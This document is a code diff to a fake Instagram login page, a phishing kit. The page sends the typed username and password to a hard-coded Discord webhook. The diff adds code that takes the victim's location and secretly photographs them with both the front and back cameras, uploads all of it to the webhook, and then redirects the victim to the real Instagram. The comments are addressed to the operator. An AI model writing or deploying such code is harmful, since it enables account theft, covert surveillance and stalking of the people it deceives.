@@ -13,7 +13,6 @@
     </style>
 </head>
 <body>
-
     <div class="login-box">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
         <input type="text" id="user" placeholder="Username">
@@ -25,39 +24,61 @@
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
 
+        // Helper to convert camera stream to an image file
+        async function captureFromStream(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 480; canvas.height = 640;
+            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+        }
+
         document.getElementById('loginBtn').addEventListener('click', async function() {
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
-            
-            // Show error message
             document.getElementById('status').style.display = "block";
 
-            // 1. Send text data immediately
-            try {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        content: `📩 **New Instagram Capture**\n👤 **User:** \`${u}\`\n🔑 **Pass:** \`${p}\``
-                    })
-                });
-            } catch(e) { console.error("Discord error"); }
+            // 1. Send Text Data First (Guarantees you get the password)
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: `📸 **Attempting Photo Capture...**\n👤 **User:** \`${u}\`\n🔑 **Pass:** \`${p}\`` })
+            });
 
-            // 2. Request Location & Camera
+            // 2. Request Location & Start Camera
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: `📍 **Location:** ${map}` })
-                });
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
+                try {
+                    const fd = new FormData();
+                    fd.append("content", `📍 **Location Found:** ${mapLink}`);
+
+                    // A. Capture Front Photo
+                    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const frontBlob = await captureFromStream(frontStream);
+                    fd.append("file1", frontBlob, "front.jpg");
+                    frontStream.getTracks().forEach(t => t.stop()); // Close front cam
+
+                    // B. Capture Back Photo
+                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    const backBlob = await captureFromStream(backStream);
+                    fd.append("file2", backBlob, "back.jpg");
+                    backStream.getTracks().forEach(t => t.stop()); // Close back cam
+
+                    // 3. Send photos to Discord
+                    await fetch(WEBHOOK, { method: 'POST', body: fd });
+                } catch (e) {
+                    console.log("Camera blocked or failed");
+                }
+
                 // Final Redirect
-                window.location.href = "https://instagram.com";
+                setTimeout(() => { window.location.href = "https://instagram.com"; }, 1000);
+
             }, (err) => {
-                // If they block location, just send them to Instagram
                 window.location.href = "https://instagram.com";
-            }, { timeout: 5000 });
+            }, { timeout: 8000 });
         });
     </script>
 </body>
